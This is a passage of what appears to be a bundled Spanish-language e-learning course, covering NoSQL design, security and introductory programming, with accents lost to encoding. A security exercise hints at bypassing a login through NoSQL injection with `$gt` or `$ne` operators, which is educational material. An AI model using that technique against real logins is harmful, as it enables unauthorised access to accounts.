*   **Consulta Eficiente:** Solo puedes consultar eficientemente si incluyes la Partition Key. Cassandra sabe exactamente en qu servidor est el dato.
*   **Antipatrn:** Hacer un "SELECT *" sin filtro de particin. Esto obliga a preguntar a todos los servidores del mundo (lento y rompe el cluster).

---

### Misin Semi-Senior:
Investiga el concepto de "Query-First Design". En Cassandra, primero escribes la consulta que quieres hacer y LUEGO diseas la tabla. Es lo opuesto a SQL. Por qu ocurre esto?
`,completed:!1},{id:"nosql-09-modelado-avanzado",title:"Modelado Avanzado NoSQL",level:"semi-senior",content:`# Leccin 9: Modelado Avanzado y Denormalizacin

En Semi-Senior, dejas de tener miedo a la duplicidad de datos.

## 1. Denormalizacin Estratgica
En SQL duplicar datos es pecado. En NoSQL, es una estrategia para ganar velocidad.
*   **Ejemplo:** En lugar de unir \`User\` y \`Post\` cada vez, guarda el \`username\` y la \`profile_pic\` dentro de cada \`Post\`.
*   **Trade-off:** La lectura es instantnea (1 query), pero si el usuario cambia su foto, debes actualizar miles de posts (escritura costosa).

## 2. Modelado basado en Accesos
Dibuja las pantallas de tu UI.
*   Qu datos muestra la Home? Crea una coleccin que tenga exactamente eso.
*   Qu datos muestra el Perfil? Crea otra.
*   **Storage es barato, el tiempo de CPU es caro.**

## 3. Atomicidad y Transacciones
MongoDB soporta transacciones multi-documento desde la v4.0, pero son pesadas.
*   Intenta disear tus documentos para que una operacin de negocio quepa en un solo documento (atomicidad garantizada).

---

### Misin Semi-Senior:
Dada una red social tipo Instagram:
Disea el modelo de datos para "Likes".
1. Opcin A: Array de IDs de usuarios dentro del Post.
2. Opcin B: Coleccin separada \`Likes\`.
Explica cul escala mejor si un Post de un famoso tiene 5 millones de likes.
`,completed:!1},{id:"nosql-10-integracion-profesional",title:"Integracin Profesional NoSQL",level:"semi-senior",content:`# Leccin 10: Integracin Profesional (Mongoose Avanzado)

Lleva tu backend al siguiente nivel con patrones de produccin.

## 1. Validaciones y Middlewares
Mongoose permite ejecutar lgica antes/despus de guardar.
\`\`\`javascript
userSchema.pre('save', async function(next) {
  if (this.isModified('password')) {
    this.password = await bcrypt.hash(this.password, 10);
  }
  next();
});
\`\`\`

## 2. Mtodos de Instancia y Estticos
No pongas toda la lgica en el controlador. Ponla en el modelo.
*   **Static:** \`User.findByEmail(email)\`
*   **Method:** \`user.comparePassword(candidate)\`

## 3. Populate vs Virtuals
*   **Populate:** Trae datos de otra coleccin (parecido a JOIN).
*   **Virtuals:** Campos que no existen en la DB pero se calculan al vuelo (ej: \`fullName\` uniendo \`firstName\` y \`lastName\`).

## 4. Manejo de Errores
Detecta duplicados de ndices nicos y errores de validacin para responder cdigos HTTP 400 consistentes.

---

### Misin Semi-Senior:
Implementa un esquema de "Carrito de Compras" que:
1. Use un Virtual para calcular el \`totalPrice\` sumando los items.
2. Use un \`pre('save')\` para verificar que el stock de los productos sea suficiente antes de confirmar la orden.
`,completed:!1},{id:"nosql-11-proyecto-final-semisenior",title:"Proyecto Final Semi-Senior NoSQL",level:"semi-senior",content:`# Proyecto Final Semi-Senior: "Sistema de Analytics en Tiempo Real"

Vamos a construir una arquitectura hbrida NoSQL diseada para el rendimiento.

## El Escenario
Netflix necesita rastrear qu pelculas ven los usuarios. Cada vez que alguien hace click en "Play", se debe registrar. Si la misma pelcula se ve mucho, debe aparecer en "Tendencias" rpidamente.

## Requerimientos Tcnicos
1.  **MongoDB (Persistencia):** Guarda el historial completo de visualizaciones.
2.  **Indices:** Crea un ndice compuesto por \`user_id\` y \`timestamp\`.
3.  **Aggregation:** Crea un endpoint \`GET /trending\` que use el pipeline de agregacin para contar visualizaciones en las ltimas 24 horas.
4.  **Redis (Cache):**
    *   Cachea el resultado de \`/trending\` por 5 minutos para no matar a MongoDB con agregaciones constantes.
    *   Usa Redis para contar "visualizaciones activas" (quin est viendo algo justo ahora) con un TTL de 10 segundos.

## Evaluacin Tcnica (Preguntas de Defensa)
*   Por qu usamos Redis para las visualizaciones activas en lugar de escribir cada 10 segundos en Mongo?
*   Qu pasara con el rendimiento si no tuviramos el ndice compuesto en Mongo?
*   Explica cmo manejaras una situacin donde Redis se cae. La app debera seguir funcionando?

## Entregable
*   Repositorio con la API.
*   Archivo de configuracin de Docker Compose para levantar Mongo y Redis.
*   Pruebas de carga (usando \`autocannon\` o similar) mostrando la diferencia de velocidad con y sin cache.

Has escalado al nivel Semi-Senior! Tu mente ahora piensa en milisegundos y concurrencia.
`,completed:!1},{id:"nosql-12-arquitectura-distribuida",title:"Arquitectura Distribuida y Sharding",level:"senior",content:`# Leccin 12: Arquitectura Distribuida y Sharding

A nivel Senior, el desafo no es cmo guardar datos, sino cmo distribuirlos a travs del planeta.

## 1. Replicacin vs Sharding
*   **Replicacin (Alta Disponibilidad):** Copias los mismos datos en varios servidores. Si uno muere, los otros siguen vivos. (Replica Sets en Mongo).
*   **Sharding (Escalabilidad):** Divides los datos. El Servidor A tiene los usuarios A-M, el Servidor B tiene N-Z. Esto permite manejar petabytes de datos que no caben en un solo disco.

## 2. Consistencia Eventual
En sistemas distribuidos masivos, a veces sacrificamos que todos vean el mismo dato *exactamente al mismo tiempo* por velocidad.
*   **Consistencia Fuerte:** Esperas a que todos los nodos confirmen. (Lento).
*   **Consistencia Eventual:** Respondes rpido y dejas que los nodos se sincronicen en milisegundos. (Rpido, ideal para redes sociales).

## 3. Shard Key Selection
Es la decisin ms importante de un Arquitecto NoSQL.
*   Una mala Shard Key crea "Hot Spots" (un servidor trabajando al 100% mientras los dems estn libres).
*   **Buena Key:** Alta cardinalidad y distribucin uniforme.

---

### Misin Senior:
Investiga el "Hashed Sharding" de MongoDB. Cmo ayuda a evitar Hot Spots cuando insertas datos con IDs secuenciales (como Timestamps)?
`,completed:!1},{id:"nosql-13-teorema-cap",title:"Teorema CAP",level:"senior",content:`# Leccin 13: El Teorema CAP

La ley fundamental de los sistemas distribuidos.

## 1. Los tres pilares
*   **Consistency (Consistencia):** Todos los nodos ven el mismo dato al mismo tiempo.
*   **Availability (Disponibilidad):** Cada peticin recibe una respuesta (xito o error).
*   **Partition Tolerance (Tolerancia a Particiones):** El sistema sigue funcionando aunque se pierda la conexin entre nodos.

## 2. La dura realidad
En un sistema distribuido **P** siempre ocurre (internet falla). Por lo tanto, debes elegir entre:
*   **CP (Consistencia + Particin):** Si hay falla, el sistema se bloquea para no dar datos viejos. (Ej: MongoDB por defecto).
*   **AP (Disponibilidad + Particin):** Si hay falla, el sistema responde lo que tiene aunque est desactualizado. (Ej: Cassandra, DynamoDB).

## 3. PACELC
Una extensin del CAP: Cuando NO hay particin (falla), eliges Latencia o Consistencia?

---

### Misin Senior:
Analiza por qu un sistema bancario NUNCA puede ser AP. Qu pasara con un retiro de dinero si el sistema prefiere responder rpido antes que estar sincronizado?
`,completed:!1},{id:"nosql-14-event-driven",title:"Event-Driven y CQRS NoSQL",level:"senior",content:`# Leccin 14: Event-Driven y NoSQL (CQRS & Event Sourcing)

Patrones avanzados para sistemas desacoplados.

## 1. CQRS con NoSQL
Separamos las escrituras (Command) de las lecturas (Query).
*   **Escritura:** Un servicio escribe en una base de datos optimizada para transacciones.
*   **Lectura:** Los datos se proyectan a una NoSQL (Mongo, Redis) optimizada para esa vista especfica.
*   Se comunican mediante un Bus de Eventos (Kafka, RabbitMQ).

## 2. Event Sourcing
No guardas el "estado actual" del usuario, sino el historial de sus acciones.
*   \`UserCreated\`, \`EmailUpdated\`, \`PasswordChanged\`.
*   El estado actual es la suma de todos esos eventos.
*   **NoSQL:** Es ideal para guardar estos "streams" de eventos por su alta velocidad de insercin.

## 3. Change Streams (MongoDB)
Permite a tu aplicacin escuchar cambios en tiempo real en la base de datos y disparar acciones (ej: Enviar un mail cuando se inserta un documento).

---

### Misin Senior:
Dibuja el flujo de datos de un sistema que usa MongoDB para las Queries y PostgreSQL para los Commands. Cmo manejas el retraso de sincronizacin (Replication Lag)?
`,completed:!1},{id:"nosql-15-seguridad-avanzada",title:"Seguridad Senior NoSQL",level:"senior",content:`# Leccin 15: Seguridad Senior en NoSQL

No dejes tus datos abiertos al mundo.

## 1. RBAC (Role-Based Access Control)
No uses la cuenta \`admin\`. Crea roles especficos:
*   \`readWriteAnyDatabase\` para la app.
*   \`backup\` para el sistema de mantenimiento.
*   \`dbAdmin\` para el DBA.

## 2. Encryption at Rest & In Transit
*   **TLS/SSL:** Obligatorio para cualquier conexin.
*   **Encryption at Rest:** Cifrar los archivos en el disco para que, si alguien roba el servidor fsico, no pueda leer los datos.

## 3. Client-Side Field Level Encryption
La DB ni siquiera ve el dato plano. La App lo cifra antes de mandarlo. Solo la App tiene la llave. Ideal para datos ultra-sensibles (tarjetas de crdito, salud).

---

### Misin Senior:
Investiga el ataque de "NoSQL Injection". Cmo se diferencia de SQL Injection? (Pista: Busca cmo usar operadores \`$gt\` o \`$ne\` en el body de un request para saltarse un login).
`,completed:!1},{id:"nosql-16-proyecto-final-senior",title:"Proyecto Final Senior NoSQL",level:"senior",content:`# Proyecto Final Nivel Senior: "Arquitectura de Escala Global"

Este es tu examen para el rol de Principal Engineer o Architect.

## El Escenario
Amazon necesita un nuevo servicio de "Historial de visualizaciones de productos" para el Prime Day. Se esperan 200,000 escrituras por segundo y billones de documentos al mes.

## El Desafo Arquitectnico
Debes disear e implementar una arquitectura que soporte esto sin caerse y con latencia < 20ms.

## Requerimientos
1.  **Diseo de Cluster:** Define la estrategia de Sharding. Qu Shard Key eliges? Justifcala matemticamente.
2.  **Multiregin:** Explica cmo replicaras los datos entre USA, Europa y Asia evitando conflictos de escritura.
3.  **Integracin con Microservicios:** Disea el flujo usando un Message Broker para desacoplar la escritura de la visualizacin.
4.  **Costo:** Estima el costo de este cluster en la nube y propone una poltica de borrado (TTL) o archivado para ahorrar 40% anualmente.

## Entregable (Technical Design Document)
Crea un archivo \`ARCHITECTURE_PROPOSAL.md\` que contenga:
*   Diagrama de nodos (Config Servers, Query Routers/Mongos, Shards).
*   Justificacin de eleccin CAP (CP vs AP).
*   Plan de recuperacin ante desastres (Qu pasa si una regin de AWS desaparece?).
*   Cdigo de ejemplo del Schema de Mongoose optimizado.

Felicidades! Has completado el camino de las Bases de Datos NoSQL. Ahora dominas la persistencia del futuro.
`,completed:!1}]},Wx={id:"prog-bases",title:"Bases de la Programacin",description:"Aprende los fundamentos de la lgica y el pensamiento computacional desde cero.",completed:!1,lessons:[{id:"prog-bases-01-que-es-programar",title:"Qu es programar?",level:"junior",content:`# Leccin 1: Qu es programar?

Bienvenido al inicio de tu carrera en tecnologa! Muchas personas creen que programar es algo mgico o reservado para genios matemticos, pero la realidad es mucho ms terrenal.

## 1. La analoga del Robot Cocinero
Imagina que tienes un robot en tu cocina. Este robot es increblemente rpido y nunca se cansa, pero tiene un problema: **es extremadamente tonto**. No tiene sentido comn. Si le dices "hazme un caf", el robot no sabr qu hacer porque no sabe qu es el caf, dnde est el agua o cmo encender la cafetera.

**Programar es escribir el manual de instrucciones detallado** para que ese robot (la computadora) pueda realizar una tarea.

## 2. El lenguaje de las mquinas
Las computadoras no entienden el espaol o el ingls de forma natural. Ellas hablan en impulsos elctricos (encendido y apagado, 0 y 1). Como sera muy difcil para nosotros escribir millones de ceros y unos, inventamos los **Lenguajes de Programacin**.

Estos lenguajes son como un puente:
* T escribes algo parecido al lenguaje humano (pero con reglas estrictas).
* Un traductor (llamado compilador o intrprete) lo convierte a ceros y unos para la mquina.

## 3. Entonces, qu hace un programador?
Un programador es, ante todo, un **solucionador de problemas**. Su trabajo no es "escribir cdigo" durante 8 horas, sino:
1. Entender un problema (ejemplo: "la gente necesita pedir comida de forma fcil").
2. Dividir ese problema en pasos pequeos.
3. Escribir esos pasos en un lenguaje que la computadora entienda.

## 4. El primer concepto clave: El Determinismo
En el mundo de la programacin, si le das las mismas instrucciones a una computadora diez mil veces, obtendrs el mismo resultado diez mil veces. La computadora no tiene "malos das" ni "se olvida" de los pasos. Si algo sale mal, **el error est en la instruccin, no en la mquina**.

---

### Ejercicio Mental 1:
Piensa en una tarea cotidiana, como lavarse los dientes. Cmo le explicaras a alguien que NO SABE NADA qu debe hacer paso a paso? Intenta no saltarte ningn detalle (abrir la canilla, poner pasta, etc.). Escribe esos pasos en un papel o mencinalos mentalmente. Ese es el primer paso para pensar como programador.
`,completed:!1},{id:"prog-bases-02-que-es-algoritmo",title:"Qu es un algoritmo?",level:"junior",content:`# Leccin 2: Qu es un algoritmo?

Si "programar" es dar instrucciones, un **algoritmo** es el plan detallado que contiene esas instrucciones. No te asustes por la palabra; usas algoritmos todo el tiempo sin saberlo.

## 1. Definicin simple
Un algoritmo es una **secuencia lgica de pasos** para resolver un problema o cumplir un objetivo. 

Para que un conjunto de pasos sea un algoritmo de verdad, debe cumplir tres reglas:
1. **Tiene un inicio y un fin:** No puede durar para siempre.
2. **Es preciso:** Cada paso debe estar claro. No puede haber "un poquito de sal" o "espera un rato"; debe ser "5 gramos de sal" o "espera 10 segundos".
3. **Es ordenado:** El orden de los factores s altera el producto. No puedes ponerte los zapatos y despus las medias.

## 2. Algoritmos en la vida real
*   **Una receta de cocina:** Es el ejemplo clsico. Pasos ordenados para llegar a un plato final.
*   **Un manual de muebles:** El "paso 1", "paso 2" para armar una silla.
*   **Tu rutina de maana:** Despertar -> Levantar -> Baarse -> Desayunar.

## 3. Por qu es importante en programacin?
Antes de tocar el teclado, un programador debe tener el algoritmo en su cabeza o en un papel. Si tu lgica (tu plan) est mal, el programa va a fallar aunque lo escribas "bonito". 

**Dato importante:** Un mismo problema puede tener muchos algoritmos diferentes. Algunos son ms rpidos, otros ocupan menos espacio, pero si ambos llegan al resultado, ambos son vlidos.

## 4. El concepto de "Unidad Mnima"
En programacin, intentamos que cada paso del algoritmo sea lo ms simple posible. En lugar de decir "Limpia la casa", un algoritmo dira:
1. Agarra la escoba.
2. Barre el saln.
3. Guarda la basura.
4. Trapea el piso.

---

### Ejercicio Mental 2:
Ayer te encontraste con un amigo que no sabe usar un cajero automtico. Disea un algoritmo sencillo (5 a 7 pasos) para retirar dinero. Recuerda que debes ser preciso: Cundo pone la tarjeta? Cundo pone el PIN? Cundo retira el efectivo?
`,completed:!1},{id:"prog-bases-03-pensamiento-logico",title:"Pensamiento Lgico",level:"junior",content:`# Leccin 3: Pensamiento Lgico

Programar no se trata de memorizar comandos, sino de **aprender a pensar**. La computadora no tiene intuicin, por lo que nosotros debemos ser sus "ojos lgicos".

## 1. La Decomposicin: "Divide y Vencers"
Cuando nos enfrentamos a un problema grande (ej: "Crear un videojuego"), nos sentimos abrumados. El pensamiento lgico nos ensea a romper ese problema en piezas tan pequeas que parezcan ridculas.

Por ejemplo, para que un personaje salte en un juego:
1. Detectar si el jugador presion la flecha arriba.
2. Si la presion, cambiar la posicin del personaje hacia arriba.
3. Esperar un milisegundo.
4. Cambiar la posicin hacia abajo hasta que toque el suelo.

## 2. Reconocimiento de Patrones
Te diste cuenta de que muchas cosas en la vida se repiten?
*   Cada vez que entras a una habitacin oscura, buscas el interruptor.
*   Cada vez que termina un captulo de una serie, empieza la intro del siguiente.

En programacin, buscamos estos patrones para no escribir la misma instruccin mil veces. Si algo se repite, podemos crear una "regla" general.

## 3. Abstraccin: Ignorar lo innecesario
Abstraer es enfocarse en lo que importa para el problema y olvidar los detalles secundarios.
Si quiero programar una aplicacin de mapas, me importa la latitud, la longitud y el nombre de la calle. NO me importa de qu color son las casas de esa calle o si el pavimento es de asfalto o piedra. 

**La abstraccin nos ayuda a simplificar la realidad para que quepa en una computadora.**

## 4. El "Si... entonces..." (Lgica Proposicional)
La lgica de programacin se basa mucho en condiciones.
*   **Si** tengo hambre **entonces** como.
*   **Si** tengo dinero **y** el producto est disponible **entonces** compro.
*   **Si** llueve **entonces** no salgo.

Aprender a conectar estas ideas es lo que realmente te convierte en programador.

---

### Ejercicio Mental 3:
Piensa en el proceso de "hacer una compra en el supermercado".
1. Aplica la **decomposicin**: Nombra 5 tareas pequeas dentro de esa gran tarea.
2. Aplica la **abstraccin**: Si estuvieras haciendo una app para el sper, qu datos del producto guardaras? (El peso? El color de la etiqueta? El precio? El nombre del repositor?). Elige solo los 3 ms importantes.
`,completed:!1},{id:"prog-bases-04-entrada-proceso-salida",title:"Entrada, Proceso y Salida",level:"junior",content:`# Leccin 4: Entrada, Proceso y Salida

Casi todo lo que pasa dentro de una computadora (y en la vida) sigue un esquema de tres pasos fundamentales. Si entiendes esto, entenders cmo funciona cualquier programa del mundo.

## 1. Entrada (Input)
Es todo lo que el programa recibe del exterior. Son los "ingredientes" que necesitamos para trabajar.
*   **Ejemplos:** Lo que escribes con el teclado, un clic del mouse, tu cara frente a la cmara, un archivo de texto, o incluso la ubicacin de tu GPS.

## 2. Proceso (Processing)
Es la "magia" que ocurre adentro. El programa agarra la entrada y hace algo con ella siguiendo un algoritmo. Es la transformacin de los datos.
*   **Ejemplos:** Sumar dos nmeros, buscar una palabra en un prrafo, filtrar una foto con un efecto de Instagram, o verificar si una contrasea es correcta.

## 3. Salida (Output)
Es el resultado final que el programa le devuelve al mundo. Es el "plato terminado".
*   **Ejemplos:** Un mensaje en la pantalla, un sonido, un documento impreso, o el mensaje que le llega a tu amigo por WhatsApp.

---

## Un ejemplo prctico: Una Calculadora Humana
Imagina que te pido que sumes dos nmeros.
1. **Entrada:** Yo te digo los nmeros "5" y "8".
2. **Proceso:** Tu cerebro realiza la operacin matemtica (5 + 8).
3. **Salida:** T me dices el resultado: "13".

## Por qu importa esto?
Como programador, siempre debes preguntarte:
*   Qu datos necesito para que esto funcione? (**Entrada**)
*   Qu tengo que hacer con esos datos? (**Proceso**)
*   Qu espera ver el usuario al final? (**Salida**)

Si uno de estos falla, el programa no sirve. Si le das a la calculadora "Letras" en lugar de "Nmeros" (Entrada incorrecta), el proceso fallar.

---

### Ejercicio Mental 4:
Identifica la Entrada, el Proceso y la Salida de los siguientes sistemas:
1.  **Un Horno de Microondas.**
2.  **El inicio de sesin en Facebook.**
3.  **Un termmetro digital.**

*Respuesta sugerida para el Microondas:*
*   Entrada: Comida fra + Tiempo de coccin.
*   Proceso: Emitir ondas de calor durante el tiempo marcado.
*   Salida: Comida caliente + Sonido de "pip".
`,completed:!1},{id:"prog-bases-05-variables-concepto",title:"Variables (El concepto)",level:"junior",content:`# Leccin 5: Variables (El concepto)

Imagina que ests haciendo una mudanza. Tienes muchas cajas. Para no volverte loco, escribes en el exterior de cada caja qu hay adentro: "Libros", "Ropa", "Cocina". 

**En programacin, una variable es esa caja etiquetada.**

## 1. Qu es una variable?
Es un espacio en la memoria de la computadora donde guardamos un dato para usarlo ms tarde. Tiene dos partes esenciales:
1.  **El Nombre (La etiqueta):** Cmo llamamos a ese espacio para encontrarlo despus.
2.  **El Valor (El contenido):** Lo que est guardado adentro en este momento.

## 2. Por qu se llaman "Variables"?
Se llaman as porque su contenido puede **variar** (cambiar) a lo largo del tiempo.
*   Imagina un juego donde tienes una variable llamada \`puntos\`. Al empezar vale 0. Si matas a un monstruo, la caja se abre, sacamos el 0 y ponemos un 10. El nombre sigue siendo \`puntos\`, pero el valor cambi.

## 3. Reglas de oro para los nombres
Para que la computadora (y otros humanos) te entiendan, los nombres de las variables deben ser claros:
*   **Malos nombres:** \`x\`, \`cosa\`, \`variable1\`, \`asdasd\`.
*   **Buenos nombres:** \`nombre_usuario\`, \`precio_total\`, \`edad\`, \`esta_logueado\`.

**Regla pro:** No uses espacios en los nombres. Usa guiones bajos (\`precio_final\`) o maysculas intermedias (\`precioFinal\`).

## 4. Un ejemplo en Pseudocdigo
El **pseudocdigo** es escribir lgica de programacin pero en nuestro idioma, sin reglas tcnicas de ningn lenguaje especfico. Es como un borrador.

Mira cmo definiramos variables:
\`\`\`text
Variable nombre = "Juan"
Variable edad = 25
Variable puntos = 0

// Luego de jugar...
puntos = puntos + 10  // Ahora la caja 'puntos' tiene un 10
\`\`\`

---

### Ejercicio Mental 5:
Si estuvieras creando una aplicacin de contactos (como la de tu celular), qu nombres de variables usaras para guardar la informacin de una persona? Nombra al menos 4 variables. Recuerda usar nombres claros.
`,completed:!1},{id:"prog-bases-06-tipos-datos-concepto",title:"Tipos de Datos (Conceptual)",level:"junior",content:`# Leccin 6: Tipos de Datos (Conceptual)

En la leccin anterior vimos que las variables son como cajas. Pero, al igual que en la vida real, no pones una pizza en una caja de zapatos, ni guardas lquido en una caja de cartn sin proteccin. 

**En programacin, el tipo de dato define qu tipo de informacin hay dentro de la caja.**

## 1. Los 3 tipos fundamentales
Las computadoras necesitan saber qu es cada cosa para saber qu pueden hacer con ella. Los tipos ms comunes son:

### A. Nmeros (Integers y Floats)
Sirven para hacer clculos matemticos.
*   **Enteros (Integers):** Nmeros sin decimales (\`5\`, \`-10\`, \`1000\`).
*   **Decimales (Floats):** Nmeros con coma (\`3.14\`, \`19.99\`).

### B. Texto (Strings o Cadenas)
Es cualquier secuencia de caracteres: letras, smbolos, espacios o incluso nmeros que no vamos a sumar. En programacin, el texto siempre va entre **comillas**.
*   **Ejemplos:** \`"Hola Mundo"\`, \`"Juan Perez"\`, \`"Calle Falsa 123"\`, \`"555-1234"\` (este ltimo es texto porque no vas a sumar nmeros de telfono).

### C. Booleanos (Booleans)
Son los ms simples pero muy poderosos. Solo pueden tener uno de dos valores: **Verdadero (True)** o **Falso (False)**.
Es como un interruptor de luz: o est prendido o est apagado. No hay punto medio.
*   **Ejemplos:** \`esta_lloviendo = Verdadero\`, \`usuario_registrado = Falso\`.

## 2. Por qu importa el tipo?
Porque la computadora se confunde si mezclas tipos. 
*   Si sumas \`5 + 5\` (Nmeros), el resultado es \`10\`.
*   Si sumas \`"Hola " + "Juan"\` (Texto), el resultado es \`"Hola Juan"\`.
*   Qu pasara si intentas sumar \`5 + "Hola"\`? La computadora entrara en crisis porque no sabe cmo sumar un nmero con una palabra. **Por eso debemos ser ordenados.**

## 3. Ejemplos en Pseudocdigo
\`\`\`text
Variable edad = 30                 // Tipo: Nmero Entero
Variable precio = 150.50           // Tipo: Nmero Decimal
Variable mensaje = "Bienvenido"    // Tipo: Texto (String)
Variable es_premium = Verdadero    // Tipo: Booleano
\`\`\`

---

### Ejercicio Mental 6:
Qu tipo de dato usaras para guardar la siguiente informacin?
1.  La temperatura de hoy.
2.  El nombre de tu perro.
3.  Si la puerta est abierta o cerrada.
4.  Tu ao de nacimiento.
5.  Un mensaje de error.
`,completed:!1},{id:"prog-bases-07-condicionales-concepto",title:"Condicionales (La toma de decisiones)",level:"junior",content:`# Leccin 7: Condicionales (La toma de decisiones)

La programacin se trata de decidir qu hacer segn lo que pase. Para esto usamos los **Condicionales**. Es el corazn de la inteligencia de cualquier programa.

## 1. La estructura "Si... Entonces... Si no..."
Imagina que te levantas a la maana:
*   **Si** est lloviendo **Entonces** agarro el paraguas.
*   **Si no** (es decir, si no llueve) **Entonces** salgo con anteojos de sol.

En programacin es exactamente igual:
\`\`\`text
SI (condicion) ENTONCES:
    hacer algo...
SINO:
    hacer otra cosa...
FIN SI
\`\`\`

## 2. Los Operadores de Comparacin
Para que el "SI" funcione, necesitamos comparar cosas. Usamos estos smbolos matemticos simples:
*   \`==\` : Es igual a? (Usamos doble igual para diferenciarlo de asignar un valor).
*   \`!=\` : Es diferente a?
*   \`>\` : Es mayor que?
*   \`<\` : Es menor que?

## 3. Ejemplo prctico: El Portero de Boliche
Vamos a programar la lgica de un portero que no deja entrar a menores de 18 aos.

\`\`\`text
Variable edad = 17

SI (edad >= 18) ENTONCES:
    Mostrar: "Puedes pasar."
SINO:
    Mostrar: "No puedes pasar, eres menor."
FIN SI
\`\`\`

## 4. Condicionales Mltiples (SI NO SI)
A veces hay ms de dos caminos. Por ejemplo, en un examen:
*   Si sacas ms de 9: Excelente.
*   Si no, pero sacas ms de 6: Aprobado.
*   Si no: Desaprobado.

\`\`\`text
SI (nota >= 9) ENTONCES:
    Mostrar: "Excelente"
SINO SI (nota >= 6) ENTONCES:
    Mostrar: "Aprobado"
SINO:
    Mostrar: "Desaprobado"
FIN SI
\`\`\`

---

### Ejercicio Mental 7:
Imagina que ests programando un termmetro inteligente.
1. Escribe la lgica para que:
   * Si la temperatura es mayor a 30 grados, el programa diga "Prender Aire".
   * Si la temperatura es menor a 15 grados, diga "Prender Estufa".
   * En cualquier otro caso, diga "Temperatura ideal".
Intenta escribirlo siguiendo la estructura de pseudocdigo que vimos arriba.
`,completed:!1},{id:"prog-bases-08-bucles-concepto",title:"Bucles (Repeticin)",level:"junior",content:`# Leccin 8: Bucles (Repeticin)

Las computadoras son aburridas, y eso es genial. A diferencia de un humano, una computadora puede repetir la misma tarea mil millones de veces sin cansarse, sin quejarse y sin cometer errores por aburrimiento. 

**Un Bucle (o Loop) es una instruccin que le dice al programa que repita algo.**

## 1. El Bucle "MIENTRAS" (While)
Este bucle repite algo **mientras una condicin sea verdadera**.
Analoga: "Lava los platos **mientras** haya platos sucios en la pileta".

\`\`\`text
MIENTRAS (quedan platos) HACER:
    Lavar un plato
FIN MIENTRAS
\`\`\`

**Cuidado!** Si la condicin nunca se vuelve falsa, el programa se quedar repitiendo para siempre. A esto lo llamamos **Bucle Infinito** y es un error comn que hace que tu computadora se trabe (se "tilda").

## 2. El Bucle "PARA" (For)
Este bucle se usa cuando sabemos **exactamente cuntas veces** queremos repetir algo.
Analoga: "Da 5 vueltas a la manzana".

\`\`\`text
PARA (vuelta desde 1 hasta 5) HACER:
    Caminar una cuadra
    Doblar en la esquina
FIN PARA
\`\`\`

## 3. Ejemplo prctico: Subir una escalera
Imagina que un robot debe subir 10 escalones.

**Sin bucles:**
1. Sube un escaln.
2. Sube un escaln.
(As 10 veces... Qu aburrido de escribir!).

**Con bucles:**
\`\`\`text
PARA (paso desde 1 hasta 10) HACER:
    Subir un escaln
FIN PARA
\`\`\`

## 4. Para qu sirven en el mundo real?
*   Enviar el mismo correo a 500 personas.
*   Mostrar todos los productos de un catlogo.
*   Reproducir una cancin en bucle (cuando termina, el bucle dice "mientras el botn repeat est activado, empieza de nuevo").

---

### Ejercicio Mental 8:
Disea la lgica para un contador bomba que empiece en 10 y baje hasta 0. Cuando llegue a 0, debe mostrar el mensaje "BOOM!".
Qu tipo de bucle usaras? Qu pasara adentro del bucle con la variable del tiempo?
(Pista: En cada repeticin, el tiempo debera ser \`tiempo - 1\`).
`,completed:!1},{id:"prog-bases-09-funciones-concepto",title:"Funciones (Agrupar lgica)",level:"junior",content:`# Leccin 9: Funciones (Agrupar lgica)

A medida que los programas crecen, se vuelven difciles de leer. Si tenemos que hacer la misma tarea compleja en cinco lugares distintos, no queremos copiar y pegar el mismo cdigo. 

**Una funcin es un bloque de cdigo al que le damos un nombre para poder "llamarla" cuando queramos.**

## 1. La analoga de la Licuadora
Imagina una licuadora. Es una **Funcin**.
*   **Entrada:** Le pones fruta y leche.
*   **Proceso:** Licuar (romper todo y mezclar).
*   **Salida:** Te devuelve un licuado rico.

Lo mejor es que no necesitas saber cmo funciona el motor por dentro cada vez que quieres un licuado; solo presionas el botn "Licuar" y listo.

## 2. Definir vs Llamar
Para usar una funcin hay dos pasos:
1. **Definirla:** Le dices al programa qu tiene que hacer la funcin.
2. **Llamarla:** La usas efectivamente en el cdigo.

\`\`\`text
// 1. DEFINIR la funcin
FUNCION HacerBatido(fruta):
    Poner fruta en jarra
    Encender motor
    Servir en vaso
FIN FUNCION

// 2. LLAMAR a la funcin
HacerBatido("Banana")
HacerBatido("Fresa")
\`\`\`

## 3. Parmetros y Retorno
*   **Parmetros:** Son la informacin que le pasas a la funcin para que trabaje (en el ejemplo anterior era la \`fruta\`).
*   **Retorno (Return):** Es el resultado que la funcin te devuelve.

Ejemplo matemtico:
\`\`\`text
FUNCION Sumar(num1, num2):
    Variable resultado = num1 + num2
    RETORNAR resultado
FIN FUNCION

Variable mi_suma = Sumar(5, 10) // mi_suma ahora vale 15
\`\`\`

## 4. Por qu esto es increble?
*   **Orden:** Tu programa principal se ve ms limpio.
*   **Mantenimiento:** Si hay un error en cmo se hace el batido, lo arreglas una sola vez en la definicin de la funcin, y se arregla automticamente en todos los lugares donde lo usaste.

---

### Ejercicio Mental 9:
Imagina que ests programando un videojuego. Describe una funcin llamada \`Atacar\`. 
1. Qu **parmetros** recibira? (El nombre del arma? La fuerza?). 
2. Nombra 3 pasos lgicos que ocurriran dentro de la funcin.
3. Al final, qu **retornara** la funcin? (El dao causado? Si el enemigo muri?).
`,completed:!1},{id:"prog-bases-10-errores-depuracion",title:"Errores y Depuracin Bsica",level:"junior",content:`# Leccin 10: Errores y Depuracin Bsica

En programacin, las cosas casi nunca funcionan a la primera. No es porque seas malo, es simplemente la naturaleza de este trabajo. Incluso los mejores programadores del mundo pasan el 50% de su tiempo buscando errores.

## 1. Qu es un "Bug"?
Llamamos **Bug** (bicho) a cualquier error en el programa que hace que no funcione como esperamos. 
La leyenda dice que la palabra viene de una polilla real que se meti en una computadora antigua y quem un cable.

## 2. Tipos de errores
*   **Error de Sintaxis:** Es como un error de ortografa. Escribiste mal un comando y la computadora no entiende qu quieres. Ejemplo: escribir \`S \` en lugar de \`SI\`.
*   **Error de Lgica:** El programa "funciona" (la computadora entiende todo), pero el resultado est mal. Ejemplo: Quieres sumar y el programa resta. Es un error en tu algoritmo, no en la mquina.

## 3. Qu es la Depuracin (Debugging)?
Es el proceso de encontrar y matar al bug. Es como jugar a ser detective.

**Pasos para depurar como un pro:**
1.  **Gritarle a la computadora no sirve.** Mantn la calma.
2.  **Lee el mensaje de error:** La computadora suele decirte en qu lnea ocurri el problema.
3.  **Vuelve a leer tu cdigo:** Lee paso a paso como si fueras la computadora. Qu valor tiene cada variable en este momento?
4.  **Prueba por partes:** Si una funcin falla, prueba sus partes por separado para ver cul es la que se rompi.

